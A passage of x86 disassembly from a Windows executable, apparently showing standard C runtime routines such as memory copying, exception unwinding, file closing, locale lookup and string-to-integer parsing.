  409dec:	mov    DWORD PTR [ebp-0x2d4],eax
  409df2:	call   DWORD PTR ds:0x40b0ac
  409df8:	lea    eax,[ebp-0x2d8]
  409dfe:	push   eax
  409dff:	call   DWORD PTR ds:0x40b0a8
  409e05:	push   0x3
  409e07:	call   0x402bbd
  409e0c:	int3   
  409e0d:	push   ebp
  409e0e:	mov    ebp,esp
  409e10:	sub    esp,0x8
  409e13:	mov    DWORD PTR [ebp-0x4],edi
  409e16:	mov    DWORD PTR [ebp-0x8],esi
  409e19:	mov    esi,DWORD PTR [ebp+0xc]
  409e1c:	mov    edi,DWORD PTR [ebp+0x8]
  409e1f:	mov    ecx,DWORD PTR [ebp+0x10]
  409e22:	shr    ecx,0x7
  409e25:	jmp    0x409e2d
  409e27:	lea    ebx,[ebx+0x0]
  409e2d:	movdqa xmm0,XMMWORD PTR [esi]
  409e31:	movdqa xmm1,XMMWORD PTR [esi+0x10]
  409e36:	movdqa xmm2,XMMWORD PTR [esi+0x20]
  409e3b:	movdqa xmm3,XMMWORD PTR [esi+0x30]
  409e40:	movdqa XMMWORD PTR [edi],xmm0
  409e44:	movdqa XMMWORD PTR [edi+0x10],xmm1
  409e49:	movdqa XMMWORD PTR [edi+0x20],xmm2
  409e4e:	movdqa XMMWORD PTR [edi+0x30],xmm3
  409e53:	movdqa xmm4,XMMWORD PTR [esi+0x40]
  409e58:	movdqa xmm5,XMMWORD PTR [esi+0x50]
  409e5d:	movdqa xmm6,XMMWORD PTR [esi+0x60]
  409e62:	movdqa xmm7,XMMWORD PTR [esi+0x70]
  409e67:	movdqa XMMWORD PTR [edi+0x40],xmm4
  409e6c:	movdqa XMMWORD PTR [edi+0x50],xmm5
  409e71:	movdqa XMMWORD PTR [edi+0x60],xmm6
  409e76:	movdqa XMMWORD PTR [edi+0x70],xmm7
  409e7b:	lea    esi,[esi+0x80]
  409e81:	lea    edi,[edi+0x80]
  409e87:	dec    ecx
  409e88:	jne    0x409e2d
  409e8a:	mov    esi,DWORD PTR [ebp-0x8]
  409e8d:	mov    edi,DWORD PTR [ebp-0x4]
  409e90:	mov    esp,ebp
  409e92:	pop    ebp
  409e93:	ret    
  409e94:	push   ebp
  409e95:	mov    ebp,esp
  409e97:	sub    esp,0x1c
  409e9a:	mov    DWORD PTR [ebp-0xc],edi
  409e9d:	mov    DWORD PTR [ebp-0x8],esi
  409ea0:	mov    DWORD PTR [ebp-0x4],ebx
  409ea3:	mov    ebx,DWORD PTR [ebp+0xc]
  409ea6:	mov    eax,ebx
  409ea8:	cdq    
  409ea9:	mov    ecx,eax
  409eab:	mov    eax,DWORD PTR [ebp+0x8]
  409eae:	xor    ecx,edx
  409eb0:	sub    ecx,edx
  409eb2:	and    ecx,0xf
  409eb5:	xor    ecx,edx
  409eb7:	sub    ecx,edx
  409eb9:	cdq    
  409eba:	mov    edi,eax
  409ebc:	xor    edi,edx
  409ebe:	sub    edi,edx
  409ec0:	and    edi,0xf
  409ec3:	xor    edi,edx
  409ec5:	sub    edi,edx
  409ec7:	mov    edx,ecx
  409ec9:	or     edx,edi
  409ecb:	jne    0x409f17
  409ecd:	mov    esi,DWORD PTR [ebp+0x10]
  409ed0:	mov    ecx,esi
  409ed2:	and    ecx,0x7f
  409ed5:	mov    DWORD PTR [ebp-0x18],ecx
  409ed8:	cmp    esi,ecx
  409eda:	je     0x409eef
  409edc:	sub    esi,ecx
  409ede:	push   esi
  409edf:	push   ebx
  409ee0:	push   eax
  409ee1:	call   0x409e0d
  409ee6:	add    esp,0xc
  409ee9:	mov    eax,DWORD PTR [ebp+0x8]
  409eec:	mov    ecx,DWORD PTR [ebp-0x18]
  409eef:	test   ecx,ecx
  409ef1:	je     0x409f6a
  409ef3:	mov    ebx,DWORD PTR [ebp+0x10]
  409ef6:	mov    edx,DWORD PTR [ebp+0xc]
  409ef9:	add    edx,ebx
  409efb:	sub    edx,ecx
  409efd:	mov    DWORD PTR [ebp-0x14],edx
  409f00:	add    ebx,eax
  409f02:	sub    ebx,ecx
  409f04:	mov    DWORD PTR [ebp-0x10],ebx
  409f07:	mov    esi,DWORD PTR [ebp-0x14]
  409f0a:	mov    edi,DWORD PTR [ebp-0x10]
  409f0d:	mov    ecx,DWORD PTR [ebp-0x18]
  409f10:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f12:	mov    eax,DWORD PTR [ebp+0x8]
  409f15:	jmp    0x409f6a
  409f17:	cmp    ecx,edi
  409f19:	jne    0x409f50
  409f1b:	neg    ecx
  409f1d:	add    ecx,0x10
  409f20:	mov    DWORD PTR [ebp-0x1c],ecx
  409f23:	mov    esi,DWORD PTR [ebp+0xc]
  409f26:	mov    edi,DWORD PTR [ebp+0x8]
  409f29:	mov    ecx,DWORD PTR [ebp-0x1c]
  409f2c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f2e:	mov    ecx,DWORD PTR [ebp+0x8]
  409f31:	add    ecx,DWORD PTR [ebp-0x1c]
  409f34:	mov    edx,DWORD PTR [ebp+0xc]
  409f37:	add    edx,DWORD PTR [ebp-0x1c]
  409f3a:	mov    eax,DWORD PTR [ebp+0x10]
  409f3d:	sub    eax,DWORD PTR [ebp-0x1c]
  409f40:	push   eax
  409f41:	push   edx
  409f42:	push   ecx
  409f43:	call   0x409e94
  409f48:	add    esp,0xc
  409f4b:	mov    eax,DWORD PTR [ebp+0x8]
  409f4e:	jmp    0x409f6a
  409f50:	mov    esi,DWORD PTR [ebp+0xc]
  409f53:	mov    edi,DWORD PTR [ebp+0x8]
  409f56:	mov    ecx,DWORD PTR [ebp+0x10]
  409f59:	mov    edx,ecx
  409f5b:	shr    ecx,0x2
  409f5e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f60:	mov    ecx,edx
  409f62:	and    ecx,0x3
  409f65:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f67:	mov    eax,DWORD PTR [ebp+0x8]
  409f6a:	mov    ebx,DWORD PTR [ebp-0x4]
  409f6d:	mov    esi,DWORD PTR [ebp-0x8]
  409f70:	mov    edi,DWORD PTR [ebp-0xc]
  409f73:	mov    esp,ebp
  409f75:	pop    ebp
  409f76:	ret    
  409f77:	int3   
  409f78:	push   ebp
  409f79:	mov    ebp,esp
  409f7b:	push   ebx
  409f7c:	push   esi
  409f7d:	push   edi
  409f7e:	push   ebp
  409f7f:	push   0x0
  409f81:	push   0x0
  409f83:	push   0x409f90
  409f88:	push   DWORD PTR [ebp+0x8]
  409f8b:	call   0x40ab3e
  409f90:	pop    ebp
  409f91:	pop    edi
  409f92:	pop    esi
  409f93:	pop    ebx
  409f94:	mov    esp,ebp
  409f96:	pop    ebp
  409f97:	ret    
  409f98:	mov    ecx,DWORD PTR [esp+0x4]
  409f9c:	test   DWORD PTR [ecx+0x4],0x6
  409fa3:	mov    eax,0x1
  409fa8:	je     0x409fdc
  409faa:	mov    eax,DWORD PTR [esp+0x14]
  409fae:	mov    ecx,DWORD PTR [eax-0x4]
  409fb1:	xor    ecx,eax
  409fb3:	call   0x401d11
  409fb8:	push   ebp
  409fb9:	mov    ebp,DWORD PTR [eax+0x10]
  409fbc:	mov    edx,DWORD PTR [eax+0x28]
  409fbf:	push   edx
  409fc0:	mov    edx,DWORD PTR [eax+0x24]
  409fc3:	push   edx
  409fc4:	call   0x409fdd
  409fc9:	add    esp,0x8
  409fcc:	pop    ebp
  409fcd:	mov    eax,DWORD PTR [esp+0x8]
  409fd1:	mov    edx,DWORD PTR [esp+0x10]
  409fd5:	mov    DWORD PTR [edx],eax
  409fd7:	mov    eax,0x3
  409fdc:	ret    
  409fdd:	push   ebx
  409fde:	push   esi
  409fdf:	push   edi
  409fe0:	mov    eax,DWORD PTR [esp+0x10]
  409fe4:	push   ebp
  409fe5:	push   eax
  409fe6:	push   0xfffffffe
  409fe8:	push   0x409f98
  409fed:	push   DWORD PTR fs:0x0
  409ff4:	mov    eax,ds:0x40e004
  409ff9:	xor    eax,esp
  409ffb:	push   eax
  409ffc:	lea    eax,[esp+0x4]
  40a000:	mov    fs:0x0,eax
  40a006:	mov    eax,DWORD PTR [esp+0x28]
  40a00a:	mov    ebx,DWORD PTR [eax+0x8]
  40a00d:	mov    esi,DWORD PTR [eax+0xc]
  40a010:	cmp    esi,0xffffffff
  40a013:	je     0x40a04f
  40a015:	cmp    DWORD PTR [esp+0x2c],0xffffffff
  40a01a:	je     0x40a022
  40a01c:	cmp    esi,DWORD PTR [esp+0x2c]
  40a020:	jbe    0x40a04f
  40a022:	lea    esi,[esi+esi*2]
  40a025:	mov    ecx,DWORD PTR [ebx+esi*4]
  40a028:	mov    DWORD PTR [esp+0xc],ecx
  40a02c:	mov    DWORD PTR [eax+0xc],ecx
  40a02f:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  40a034:	jne    0x40a04d
  40a036:	push   0x101
  40a03b:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  40a03f:	call   0x40a08d
  40a044:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  40a048:	call   0x40a0ac
  40a04d:	jmp    0x40a006
  40a04f:	mov    ecx,DWORD PTR [esp+0x4]
  40a053:	mov    DWORD PTR fs:0x0,ecx
  40a05a:	add    esp,0x18
  40a05d:	pop    edi
  40a05e:	pop    esi
  40a05f:	pop    ebx
  40a060:	ret    
  40a061:	xor    eax,eax
  40a063:	mov    ecx,DWORD PTR fs:0x0
  40a06a:	cmp    DWORD PTR [ecx+0x4],0x409f98
  40a071:	jne    0x40a083
  40a073:	mov    edx,DWORD PTR [ecx+0xc]
  40a076:	mov    edx,DWORD PTR [edx+0xc]
  40a079:	cmp    DWORD PTR [ecx+0x8],edx
  40a07c:	jne    0x40a083
  40a07e:	mov    eax,0x1
  40a083:	ret    
  40a084:	push   ebx
  40a085:	push   ecx
  40a086:	mov    ebx,0x40edb4
  40a08b:	jmp    0x40a098
  40a08d:	push   ebx
  40a08e:	push   ecx
  40a08f:	mov    ebx,0x40edb4
  40a094:	mov    ecx,DWORD PTR [esp+0xc]
  40a098:	mov    DWORD PTR [ebx+0x8],ecx
  40a09b:	mov    DWORD PTR [ebx+0x4],eax
  40a09e:	mov    DWORD PTR [ebx+0xc],ebp
  40a0a1:	push   ebp
  40a0a2:	push   ecx
  40a0a3:	push   eax
  40a0a4:	pop    eax
  40a0a5:	pop    ecx
  40a0a6:	pop    ebp
  40a0a7:	pop    ecx
  40a0a8:	pop    ebx
  40a0a9:	ret    0x4
  40a0ac:	call   eax
  40a0ae:	ret    
  40a0af:	xor    eax,eax
  40a0b1:	push   eax
  40a0b2:	push   eax
  40a0b3:	push   0x3
  40a0b5:	push   eax
  40a0b6:	push   0x3
  40a0b8:	push   0x40000000
  40a0bd:	push   0x40c454
  40a0c2:	call   DWORD PTR ds:0x40b034
  40a0c8:	mov    ds:0x40edc8,eax
  40a0cd:	ret    
  40a0ce:	mov    eax,ds:0x40edc8
  40a0d3:	push   esi
  40a0d4:	mov    esi,DWORD PTR ds:0x40b030
  40a0da:	cmp    eax,0xffffffff
  40a0dd:	je     0x40a0e7
  40a0df:	cmp    eax,0xfffffffe
  40a0e2:	je     0x40a0e7
  40a0e4:	push   eax
  40a0e5:	call   esi
  40a0e7:	mov    eax,ds:0x40edc4
  40a0ec:	cmp    eax,0xffffffff
  40a0ef:	je     0x40a0f9
  40a0f1:	cmp    eax,0xfffffffe
  40a0f4:	je     0x40a0f9
  40a0f6:	push   eax
  40a0f7:	call   esi
  40a0f9:	pop    esi
  40a0fa:	ret    
  40a0fb:	mov    edi,edi
  40a0fd:	push   ebp
  40a0fe:	mov    ebp,esp
  40a100:	push   ebx
  40a101:	push   esi
  40a102:	mov    esi,DWORD PTR [ebp+0x8]
  40a105:	push   edi
  40a106:	xor    edi,edi
  40a108:	or     ebx,0xffffffff
  40a10b:	cmp    esi,edi
  40a10d:	jne    0x40a12b
  40a10f:	call   0x4024b6
  40a114:	push   edi
  40a115:	push   edi
  40a116:	push   edi
  40a117:	push   edi
  40a118:	push   edi
  40a119:	mov    DWORD PTR [eax],0x16
  40a11f:	call   0x40244e
  40a124:	add    esp,0x14
  40a127:	or     eax,ebx
  40a129:	jmp    0x40a16d
  40a12b:	test   BYTE PTR [esi+0xc],0x83
  40a12f:	je     0x40a168
  40a131:	push   esi
  40a132:	call   0x4088da
  40a137:	push   esi
  40a138:	mov    ebx,eax
  40a13a:	call   0x40a98d
  40a13f:	push   esi
  40a140:	call   0x404a09
  40a145:	push   eax
  40a146:	call   0x40a8c0
  40a14b:	add    esp,0x10
  40a14e:	test   eax,eax
  40a150:	jge    0x40a157
  40a152:	or     ebx,0xffffffff
  40a155:	jmp    0x40a168
  40a157:	mov    eax,DWORD PTR [esi+0x1c]
  40a15a:	cmp    eax,edi
  40a15c:	je     0x40a168
  40a15e:	push   eax
  40a15f:	call   0x402682
  40a164:	pop    ecx
  40a165:	mov    DWORD PTR [esi+0x1c],edi
  40a168:	mov    DWORD PTR [esi+0xc],edi
  40a16b:	mov    eax,ebx
  40a16d:	pop    edi
  40a16e:	pop    esi
  40a16f:	pop    ebx
  40a170:	pop    ebp
  40a171:	ret    
  40a172:	push   0xc
  40a174:	push   0x40ca60
  40a179:	call   0x403b74
  40a17e:	or     DWORD PTR [ebp-0x1c],0xffffffff
  40a182:	xor    eax,eax
  40a184:	mov    esi,DWORD PTR [ebp+0x8]
  40a187:	xor    edi,edi
  40a189:	cmp    esi,edi
  40a18b:	setne  al
  40a18e:	cmp    eax,edi
  40a190:	jne    0x40a1af
  40a192:	call   0x4024b6
  40a197:	mov    DWORD PTR [eax],0x16
  40a19d:	push   edi
  40a19e:	push   edi
  40a19f:	push   edi
  40a1a0:	push   edi
  40a1a1:	push   edi
  40a1a2:	call   0x40244e
  40a1a7:	add    esp,0x14
  40a1aa:	or     eax,0xffffffff
  40a1ad:	jmp    0x40a1bb
  40a1af:	test   BYTE PTR [esi+0xc],0x40
  40a1b3:	je     0x40a1c1
  40a1b5:	mov    DWORD PTR [esi+0xc],edi
  40a1b8:	mov    eax,DWORD PTR [ebp-0x1c]
  40a1bb:	call   0x403bb9
  40a1c0:	ret    
  40a1c1:	push   esi
  40a1c2:	call   0x40492b
  40a1c7:	pop    ecx
  40a1c8:	mov    DWORD PTR [ebp-0x4],edi
  40a1cb:	push   esi
  40a1cc:	call   0x40a0fb
  40a1d1:	pop    ecx
  40a1d2:	mov    DWORD PTR [ebp-0x1c],eax
  40a1d5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40a1dc:	call   0x40a1e6
  40a1e1:	jmp    0x40a1b8
  40a1e3:	mov    esi,DWORD PTR [ebp+0x8]
  40a1e6:	push   esi
  40a1e7:	call   0x40499e
  40a1ec:	pop    ecx
  40a1ed:	ret    
  40a1ee:	push   0x10
  40a1f0:	push   0x40ca80
  40a1f5:	call   0x403b74
  40a1fa:	mov    eax,DWORD PTR [ebp+0x8]
  40a1fd:	cmp    eax,0xfffffffe
  40a200:	jne    0x40a215
  40a202:	call   0x4024b6
  40a207:	mov    DWORD PTR [eax],0x9
  40a20d:	or     eax,0xffffffff
  40a210:	jmp    0x40a2bf
  40a215:	xor    ebx,ebx
  40a217:	cmp    eax,ebx
  40a219:	jl     0x40a223
  40a21b:	cmp    eax,DWORD PTR ds:0x412450
  40a221:	jb     0x40a23d
  40a223:	call   0x4024b6
  40a228:	mov    DWORD PTR [eax],0x9
  40a22e:	push   ebx
  40a22f:	push   ebx
  40a230:	push   ebx
  40a231:	push   ebx
  40a232:	push   ebx
  40a233:	call   0x40244e
  40a238:	add    esp,0x14
  40a23b:	jmp    0x40a20d
  40a23d:	mov    ecx,eax
  40a23f:	sar    ecx,0x5
  40a242:	lea    edi,[ecx*4+0x412460]
  40a249:	mov    esi,eax
  40a24b:	and    esi,0x1f
  40a24e:	shl    esi,0x6
  40a251:	mov    ecx,DWORD PTR [edi]
  40a253:	movsx  ecx,BYTE PTR [esi+ecx*1+0x4]
  40a258:	and    ecx,0x1
  40a25b:	je     0x40a223
  40a25d:	push   eax
  40a25e:	call   0x408678
  40a263:	pop    ecx
  40a264:	mov    DWORD PTR [ebp-0x4],ebx
  40a267:	mov    eax,DWORD PTR [edi]
  40a269:	test   BYTE PTR [esi+eax*1+0x4],0x1
  40a26e:	je     0x40a2a1
  40a270:	push   DWORD PTR [ebp+0x8]
  40a273:	call   0x408601
  40a278:	pop    ecx
  40a279:	push   eax
  40a27a:	call   DWORD PTR ds:0x40b02c
  40a280:	test   eax,eax
  40a282:	jne    0x40a28f
  40a284:	call   DWORD PTR ds:0x40b08c
  40a28a:	mov    DWORD PTR [ebp-0x1c],eax
  40a28d:	jmp    0x40a292
  40a28f:	mov    DWORD PTR [ebp-0x1c],ebx
  40a292:	cmp    DWORD PTR [ebp-0x1c],ebx
  40a295:	je     0x40a2b0
  40a297:	call   0x4024c9
  40a29c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a29f:	mov    DWORD PTR [eax],ecx
  40a2a1:	call   0x4024b6
  40a2a6:	mov    DWORD PTR [eax],0x9
  40a2ac:	or     DWORD PTR [ebp-0x1c],0xffffffff
  40a2b0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40a2b7:	call   0x40a2c5
  40a2bc:	mov    eax,DWORD PTR [ebp-0x1c]
  40a2bf:	call   0x403bb9
  40a2c4:	ret    
  40a2c5:	push   DWORD PTR [ebp+0x8]
  40a2c8:	call   0x408718
  40a2cd:	pop    ecx
  40a2ce:	ret    
  40a2cf:	mov    edi,edi
  40a2d1:	push   ebp
  40a2d2:	mov    ebp,esp
  40a2d4:	sub    esp,0xc
  40a2d7:	mov    eax,ds:0x40e004
  40a2dc:	xor    eax,ebp
  40a2de:	mov    DWORD PTR [ebp-0x4],eax
  40a2e1:	push   0x6
  40a2e3:	lea    eax,[ebp-0xc]
  40a2e6:	push   eax
  40a2e7:	push   0x1004
  40a2ec:	push   DWORD PTR [ebp+0x8]
  40a2ef:	mov    BYTE PTR [ebp-0x6],0x0
  40a2f3:	call   DWORD PTR ds:0x40b03c
  40a2f9:	test   eax,eax
  40a2fb:	jne    0x40a302
  40a2fd:	or     eax,0xffffffff
  40a300:	jmp    0x40a30c
  40a302:	lea    eax,[ebp-0xc]
  40a305:	push   eax
  40a306:	call   0x40a4fc
  40a30b:	pop    ecx
  40a30c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a30f:	xor    ecx,ebp
  40a311:	call   0x401d11
  40a316:	leave  
  40a317:	ret    
  40a318:	mov    edi,edi
  40a31a:	push   ebp
  40a31b:	mov    ebp,esp
  40a31d:	sub    esp,0x34
  40a320:	mov    eax,ds:0x40e004
  40a325:	xor    eax,ebp
  40a327:	mov    DWORD PTR [ebp-0x4],eax
  40a32a:	mov    eax,DWORD PTR [ebp+0x10]
  40a32d:	mov    ecx,DWORD PTR [ebp+0x18]
  40a330:	mov    DWORD PTR [ebp-0x28],eax
  40a333:	mov    eax,DWORD PTR [ebp+0x14]
  40a336:	push   ebx
  40a337:	mov    DWORD PTR [ebp-0x30],eax
  40a33a:	mov    eax,DWORD PTR [eax]
  40a33c:	push   esi
  40a33d:	mov    DWORD PTR [ebp-0x24],eax
  40a340:	mov    eax,DWORD PTR [ebp+0x8]
  40a343:	push   edi
  40a344:	xor    edi,edi
  40a346:	mov    DWORD PTR [ebp-0x34],ecx
  40a349:	mov    DWORD PTR [ebp-0x20],edi
  40a34c:	mov    DWORD PTR [ebp-0x2c],edi
  40a34f:	cmp    eax,DWORD PTR [ebp+0xc]
  40a352:	je     0x40a4b7
  40a358:	mov    esi,DWORD PTR ds:0x40b138
  40a35e:	lea    ecx,[ebp-0x18]
  40a361:	push   ecx
  40a362:	push   eax
  40a363:	call   esi
  40a365:	mov    ebx,DWORD PTR ds:0x40b148
  40a36b:	test   eax,eax
  40a36d:	je     0x40a3cd
  40a36f:	cmp    DWORD PTR [ebp-0x18],0x1
  40a373:	jne    0x40a3cd
  40a375:	lea    eax,[ebp-0x18]
  40a378:	push   eax
  40a379:	push   DWORD PTR [ebp+0xc]
  40a37c:	call   esi
  40a37e:	test   eax,eax
  40a380:	je     0x40a3cd
  40a382:	cmp    DWORD PTR [ebp-0x18],0x1
  40a386:	jne    0x40a3cd
  40a388:	mov    esi,DWORD PTR [ebp-0x24]
  40a38b:	mov    DWORD PTR [ebp-0x2c],0x1
  40a392:	cmp    esi,0xffffffff
  40a395:	jne    0x40a3a3
  40a397:	push   DWORD PTR [ebp-0x28]
  40a39a:	call   0x405610
  40a39f:	mov    esi,eax
  40a3a1:	pop    ecx
  40a3a2:	inc    esi
  40a3a3:	cmp    esi,edi
  40a3a5:	jle    0x40a402
  40a3a7:	cmp    esi,0x7ffffff0
  40a3ad:	ja     0x40a402
  40a3af:	lea    eax,[esi+esi*1+0x8]
  40a3b3:	cmp    eax,0x400
  40a3b8:	ja     0x40a3e9
  40a3ba:	call   0x40a4d0
  40a3bf:	mov    eax,esp
  40a3c1:	cmp    eax,edi
  40a3c3:	je     0x40a3fd
  40a3c5:	mov    DWORD PTR [eax],0xcccc
  40a3cb:	jmp    0x40a3fa
  40a3cd:	push   edi
  40a3ce:	push   edi
  40a3cf:	push   DWORD PTR [ebp-0x24]
  40a3d2:	push   DWORD PTR [ebp-0x28]
  40a3d5:	push   0x1
  40a3d7:	push   DWORD PTR [ebp+0x8]
  40a3da:	call   ebx
  40a3dc:	mov    esi,eax
  40a3de:	cmp    esi,edi
  40a3e0:	jne    0x40a3a5
  40a3e2:	xor    eax,eax
  40a3e4:	jmp    0x40a4ba
  40a3e9:	push   eax
  40a3ea:	call   0x407328
  40a3ef:	pop    ecx
  40a3f0:	cmp    eax,edi
  40a3f2:	je     0x40a3fd
  40a3f4:	mov    DWORD PTR [eax],0xdddd
  40a3fa:	add    eax,0x8
  40a3fd:	mov    DWORD PTR [ebp-0x1c],eax
  40a400:	jmp    0x40a405
  40a402:	mov    DWORD PTR [ebp-0x1c],edi
  40a405:	cmp    DWORD PTR [ebp-0x1c],edi
  40a408:	je     0x40a3e2
  40a40a:	lea    eax,[esi+esi*1]
  40a40d:	push   eax
  40a40e:	push   edi
  40a40f:	push   DWORD PTR [ebp-0x1c]
  40a412:	call   0x4058c0
  40a417:	add    esp,0xc
  40a41a:	push   esi
  40a41b:	push   DWORD PTR [ebp-0x1c]
  40a41e:	push   DWORD PTR [ebp-0x24]
  40a421:	push   DWORD PTR [ebp-0x28]
  40a424:	push   0x1
  40a426:	push   DWORD PTR [ebp+0x8]
  40a429:	call   ebx
  40a42b:	test   eax,eax
  40a42d:	je     0x40a4ae
  40a42f:	mov    ebx,DWORD PTR [ebp-0x34]
  40a432:	cmp    ebx,edi
  40a434:	je     0x40a453
  40a436:	push   edi
  40a437:	push   edi
  40a438:	push   DWORD PTR [ebp+0x1c]
  40a43b:	push   ebx
  40a43c:	push   esi
  40a43d:	push   DWORD PTR [ebp-0x1c]
  40a440:	push   edi
  40a441:	push   DWORD PTR [ebp+0xc]
  40a444:	call   DWORD PTR ds:0x40b124
  40a44a:	test   eax,eax
  40a44c:	je     0x40a4ae
  40a44e:	mov    DWORD PTR [ebp-0x20],ebx
  40a451:	jmp    0x40a4ae
  40a453:	mov    ebx,DWORD PTR ds:0x40b124
  40a459:	cmp    DWORD PTR [ebp-0x2c],edi
  40a45c:	jne    0x40a472
  40a45e:	push   edi
  40a45f:	push   edi
  40a460:	push   edi
  40a461:	push   edi
  40a462:	push   esi
  40a463:	push   DWORD PTR [ebp-0x1c]
  40a466:	push   edi
  40a467:	push   DWORD PTR [ebp+0xc]
  40a46a:	call   ebx
  40a46c:	mov    esi,eax
  40a46e:	cmp    esi,edi
  40a470:	je     0x40a4ae
  40a472:	push   esi
  40a473:	push   0x1
  40a475:	call   0x40281d
  40a47a:	pop    ecx
  40a47b:	pop    ecx
  40a47c:	mov    DWORD PTR [ebp-0x20],eax
  40a47f:	cmp    eax,edi
  40a481:	je     0x40a4ae
  40a483:	push   edi
  40a484:	push   edi
  40a485:	push   esi
  40a486:	push   eax
  40a487:	push   esi
  40a488:	push   DWORD PTR [ebp-0x1c]
  40a48b:	push   edi
  40a48c:	push   DWORD PTR [ebp+0xc]
  40a48f:	call   ebx
  40a491:	cmp    eax,edi
  40a493:	jne    0x40a4a3
  40a495:	push   DWORD PTR [ebp-0x20]
  40a498:	call   0x402682
  40a49d:	pop    ecx
  40a49e:	mov    DWORD PTR [ebp-0x20],edi
  40a4a1:	jmp    0x40a4ae
  40a4a3:	cmp    DWORD PTR [ebp-0x24],0xffffffff
  40a4a7:	je     0x40a4ae
  40a4a9:	mov    ecx,DWORD PTR [ebp-0x30]
  40a4ac:	mov    DWORD PTR [ecx],eax
  40a4ae:	push   DWORD PTR [ebp-0x1c]
  40a4b1:	call   0x408a6d
  40a4b6:	pop    ecx
  40a4b7:	mov    eax,DWORD PTR [ebp-0x20]
  40a4ba:	lea    esp,[ebp-0x40]
  40a4bd:	pop    edi
  40a4be:	pop    esi
  40a4bf:	pop    ebx
  40a4c0:	mov    ecx,DWORD PTR [ebp-0x4]
  40a4c3:	xor    ecx,ebp
  40a4c5:	call   0x401d11
  40a4ca:	leave  
  40a4cb:	ret    
  40a4cc:	int3   
  40a4cd:	int3   
  40a4ce:	int3   
  40a4cf:	int3   
  40a4d0:	push   ecx
  40a4d1:	lea    ecx,[esp+0x8]
  40a4d5:	sub    ecx,eax
  40a4d7:	and    ecx,0xf
  40a4da:	add    eax,ecx
  40a4dc:	sbb    ecx,ecx
  40a4de:	or     eax,ecx
  40a4e0:	pop    ecx
  40a4e1:	jmp    0x408810
  40a4e6:	push   ecx
  40a4e7:	lea    ecx,[esp+0x8]
  40a4eb:	sub    ecx,eax
  40a4ed:	and    ecx,0x7
  40a4f0:	add    eax,ecx
  40a4f2:	sbb    ecx,ecx
  40a4f4:	or     eax,ecx
  40a4f6:	pop    ecx
  40a4f7:	jmp    0x408810
  40a4fc:	mov    edi,edi
  40a4fe:	push   ebp
  40a4ff:	mov    ebp,esp
  40a501:	push   0xa
  40a503:	push   0x0
  40a505:	push   DWORD PTR [ebp+0x8]
  40a508:	call   0x40a741
  40a50d:	add    esp,0xc
  40a510:	pop    ebp
  40a511:	ret    
  40a512:	mov    edi,edi
  40a514:	push   ebp
  40a515:	mov    ebp,esp
  40a517:	sub    esp,0x14
  40a51a:	push   esi
  40a51b:	push   edi
  40a51c:	push   DWORD PTR [ebp+0x8]
  40a51f:	lea    ecx,[ebp-0x14]
  40a522:	call   0x402290
  40a527:	mov    eax,DWORD PTR [ebp+0x10]
  40a52a:	mov    esi,DWORD PTR [ebp+0xc]
  40a52d:	xor    edi,edi
  40a52f:	cmp    eax,edi
  40a531:	je     0x40a535
  40a533:	mov    DWORD PTR [eax],esi
  40a535:	cmp    esi,edi
  40a537:	jne    0x40a565
  40a539:	call   0x4024b6
  40a53e:	push   edi
  40a53f:	push   edi
  40a540:	push   edi
  40a541:	push   edi
  40a542:	push   edi
  40a543:	mov    DWORD PTR [eax],0x16
  40a549:	call   0x40244e
  40a54e:	add    esp,0x14
  40a551:	cmp    BYTE PTR [ebp-0x8],0x0
  40a555:	je     0x40a55e
  40a557:	mov    eax,DWORD PTR [ebp-0xc]
  40a55a:	and    DWORD PTR [eax+0x70],0xfffffffd
  40a55e:	xor    eax,eax
  40a560:	jmp    0x40a73d
  40a565:	cmp    DWORD PTR [ebp+0x14],edi
  40a568:	je     0x40a576
  40a56a:	cmp    DWORD PTR [ebp+0x14],0x2
  40a56e:	jl     0x40a539
  40a570:	cmp    DWORD PTR [ebp+0x14],0x24
  40a574:	jg     0x40a539
  40a576:	mov    ecx,DWORD PTR [ebp-0x14]
  40a579:	push   ebx
  40a57a:	mov    bl,BYTE PTR [esi]
  40a57c:	mov    DWORD PTR [ebp-0x4],edi
  40a57f:	lea    edi,[esi+0x1]
  40a582:	cmp    DWORD PTR [ecx+0xac],0x1
  40a589:	jle    0x40a5a2
  40a58b:	lea    eax,[ebp-0x14]
  40a58e:	push   eax
  40a58f:	movzx  eax,bl
  40a592:	push   0x8
  40a594:	push   eax
  40a595:	call   0x40a76c
  40a59a:	mov    ecx,DWORD PTR [ebp-0x14]
  40a59d:	add    esp,0xc
  40a5a0:	jmp    0x40a5b2
  40a5a2:	mov    edx,DWORD PTR [ecx+0xc8]
  40a5a8:	movzx  eax,bl
  40a5ab:	movzx  eax,WORD PTR [edx+eax*2]
  40a5af:	and    eax,0x8
  40a5b2:	test   eax,eax
  40a5b4:	je     0x40a5bb
  40a5b6:	mov    bl,BYTE PTR [edi]
  40a5b8:	inc    edi
  40a5b9:	jmp    0x40a582
  40a5bb:	cmp    bl,0x2d
  40a5be:	jne    0x40a5c6
  40a5c0:	or     DWORD PTR [ebp+0x18],0x2
  40a5c4:	jmp    0x40a5cb
  40a5c6:	cmp    bl,0x2b
  40a5c9:	jne    0x40a5ce
  40a5cb:	mov    bl,BYTE PTR [edi]
  40a5cd:	inc    edi
  40a5ce:	mov    eax,DWORD PTR [ebp+0x14]
  40a5d1:	test   eax,eax
  40a5d3:	jl     0x40a724
  40a5d9:	cmp    eax,0x1
  40a5dc:	je     0x40a724
  40a5e2:	cmp    eax,0x24
  40a5e5:	jg     0x40a724
  40a5eb:	test   eax,eax
  40a5ed:	jne    0x40a619
  40a5ef:	cmp    bl,0x30
  40a5f2:	je     0x40a5fd
  40a5f4:	mov    DWORD PTR [ebp+0x14],0xa
  40a5fb:	jmp    0x40a631
  40a5fd:	mov    al,BYTE PTR [edi]
  40a5ff:	cmp    al,0x78
  40a601:	je     0x40a610
  40a603:	cmp    al,0x58
  40a605:	je     0x40a610
  40a607:	mov    DWORD PTR [ebp+0x14],0x8
